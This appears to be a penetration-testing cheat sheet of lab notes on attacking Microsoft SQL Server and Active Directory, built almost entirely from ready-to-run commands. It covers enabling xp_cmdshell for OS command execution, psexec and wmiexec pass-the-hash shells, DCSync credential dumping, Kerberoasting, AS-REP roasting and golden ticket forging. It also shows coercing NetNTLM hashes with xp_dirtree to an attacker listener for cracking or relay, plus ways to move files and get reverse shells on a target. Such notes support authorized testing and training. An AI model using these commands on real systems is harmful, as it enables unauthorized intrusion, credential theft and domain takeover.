## SQL login — password prompted

**Kali**

```bash
impacket-mssqlclient 'USER@TARGET_IP'
```

## Domain account — password prompted

**Kali**

```bash
impacket-mssqlclient -windows-auth 'DOMAIN/USER@TARGET_IP'
```

## Inside the SQL prompt

**MSSQL prompt**

```sql
help
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.databases;
```

## OS command — requires appropriate SQL privileges

**Impacket SQL prompt**

```text
enable_xp_cmdshell
xp_cmdshell whoami
```

Enables xp_cmdshell on the server.

## If it fails

| Symptom | Check |
| --- | --- |
| Login failed | Confirm SQL authentication versus Windows authentication. Use -windows-auth for the domain account form; verify the SQL instance and port. |
| xp_cmdshell permission denied | A SQL login does not imply sysadmin or OS command execution rights. Check the role query before trying the optional command-execution block. |

<Accordion title="MSSQL">

### MSSQL

**Footprinting: Service-by-Service Lab Workflow**

```bash
# Connect remotely (Impacket)
mssqlclient.py <user>:'<pass>'@<IP>
mssqlclient.py <user>:'<pass>'@<IP> -port <port>

# Connect locally on Windows (sqlcmd)
sqlcmd -S <server> -U sa -P "<pass>"
sqlcmd -S <server> -E                  # Windows auth (no password)

# Useful queries
SELECT name FROM sys.databases;
GO
USE <database>;
GO
SELECT * FROM INFORMATION_SCHEMA.TABLES;
GO
SELECT * FROM <table>;
GO

# Enable OS command execution (as sa)
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell dir C:\Users
```

</Accordion>

<Accordion title="Original captured examples">

### Original captured examples

**Impacket: Script Quick Reference**

```bash
# remote execution (need admin creds or hash)
psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
smbexec.py / atexec.py / dcomexec.py        # alternatives
# credentials
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
# tickets
getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
# shares / lookups
smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
```

<Accordion title="Footprinting &amp; scanning">

### Footprinting & scanning

**Microsoft SQL Server Enumeration**

```bash
# Nmap script sweep (version, blank sa pw, xp_cmdshell, config, NTLM info)
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-xp-cmdshell,ms-sql-config -sV -p1433 <IP>

# Metasploit ping sweep (UDP 1434 → instance/version/port)
msfconsole -q
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <IP>
run
```

<Accordion title="When you don&#x27;t have sysadmin: steal the service account&#x27;s hash with xp_dirtree">

### When you don't have sysadmin: steal the service account's hash with xp_dirtree

**Microsoft SQL Server Enumeration**

```bash
# 1. On your box, listen for the inbound authentication
sudo responder -I tun0                 # capture the NetNTLM hash to crack offline
# (or) sudo impacket-ntlmrelayx -t <other-host> -smb2support   # relay it instead of cracking
```

**Microsoft SQL Server Enumeration**

```sql
-- 2. From the SQL prompt, force SQL Server to authenticate to you
EXEC xp_dirtree '\\<your-IP>\share', 1, 1;
```

**Microsoft SQL Server Enumeration**

Context from the notebook: You then either  crack  the captured NetNTLM hash offline ( hashcat -m 5600 ) or  relay  it with  ntlmrelayx  to authenticate to another host the service account can access — no cracking required. This is the standard escape hatch when the login isn't sysadmin.

```text
hashcat -m 5600
```

</Accordion>

<Accordion title="Mental Model — &quot;What Do I Use When?&quot;">

### Mental Model — "What Do I Use When?"

**Ports, Protocols, and Services by Purpose**

```text
"I found an open port"
├── Is it a file share?    → SMB (445), NFS (2049), FTP (21)
├── Is it remote access?   → SSH (22), RDP (3389), WinRM (5985)
├── Is it a web server?    → HTTP (80/443) → fingerprint → fuzz
├── Is it email?           → SMTP (25), IMAP (143), POP3 (110)
├── Is it a database?      → MySQL (3306), MSSQL (1433), Oracle (1521)
├── Is it monitoring?      → SNMP (161), IPMI (623)
└── Not sure?              → nmap -sV -sC <IP> -p <port>

"I need to get files off the target"
├── Linux → scp/sftp (22)
├── Windows → SMB (445) or evil-winrm download
├── Web → wget/curl
└── Simple → python3 -m http.server (on target)

"I need to get files onto the target"
├── Linux → scp/sftp (22) or wget from attacker
├── Windows → SMB, certutil, PowerShell wget
├── Web upload → if upload form exists
└── Simple → python3 -m http.server (on attacker)

"I need a shell"
├── Linux → SSH (22)
├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
└── Either → reverse shell via exploit
```

</Accordion>
